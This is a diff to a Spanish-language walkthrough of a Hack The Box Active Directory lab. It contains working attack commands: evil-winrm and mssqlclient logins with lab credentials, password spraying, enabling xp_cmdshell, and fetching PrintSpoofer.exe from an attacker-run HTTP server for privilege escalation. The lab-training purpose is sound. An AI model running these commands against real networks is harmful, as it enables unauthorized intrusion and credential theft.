@@ -86,7 +86,6 @@ evil-winrm -i 172.16.7.50 -u AB920 -p weasal
 Ahora solo nos movemos al directorio de la flag. `C:\flag.txt`
 
 **Utilice un método común para obtener credenciales débiles de otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.**
-
 Vamos a enumerar los usuarios desde el `DC` y exportarlos a un archivo.
 ```bash
 sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee  usernames.txt
@@ -96,8 +95,6 @@ Nos quedamos solo con los usuarios.
 ```bash
 cat usernames.txt | awk '{print $5}' | grep 'INLANEFREIGHT.LOCAL' | awk -F'\\\\' '{print $2}'
 ```
-
-**Utilice un método común para obtener credenciales débiles de otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.**
 
 Hacemos rociado de contraseñas con `Welcome1` con la lista de usuarios que tenemos. 
 ```bash
@@ -141,15 +138,13 @@ Nos conectamos al host por mssql dado que es un servidor con una base de datos d
 mssqlclient.py -dc-ip 172.16.7.3 INLANEFREIGHT/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
 ```
 
-Vemos que tenemos acceso sin embargo no tenemos permisos para leer la flag que se encuentra en el path de `Administrator`.
-
 Habilitamos el `xp_cmdshell` para poder ejecutar comando en el servidor a través de SQL:
-
 ```sql
 enable_xp_cmdshell;
 ```
 
 ![](../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-1.png)
+Vemos que tenemos acceso sin embargo no tenemos permisos para leer la flag que se encuentra en el path de `Administrator`.
 
 Cuando revisamos la información de los permisos del usuario:
 ```sql 
@@ -186,8 +181,6 @@ python -m http.server
 Desde `SQL01` nos lo descargamos, debemos situarnos en un directorio que tengamos permisos de escritura, `C\Users\Public` por ejemplo:
 ```powershell
 Invoke-WebRequest -Uri http://172.16.7.240:8000/PrintSpoofer.exe -OutFile .\PrintSpoofer.exe 
-
-Invoke-WebRequest -Uri http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile .\PrintSpoofer64.exe 
 ```
 ![](../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-6.png)
 
@@ -302,7 +295,15 @@ Convert-SidToName "S-1-5-21-3327542485-274640656-2609762496-4611"
 ![](../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-6.png)
 `CT059`
 
+**Descifre el hash de la contraseña de este usuario y envíe la contraseña en texto sin formato como respuesta.**
 
+
+
+**Envíe el contenido del archivo flag.txt en el escritorio del administrador en el host DC01.**
+
+
+
+**Envíe el hash NTLM de la cuenta KRBTGT para el dominio de destino después de lograr el compromiso del dominio.**
 
 
 
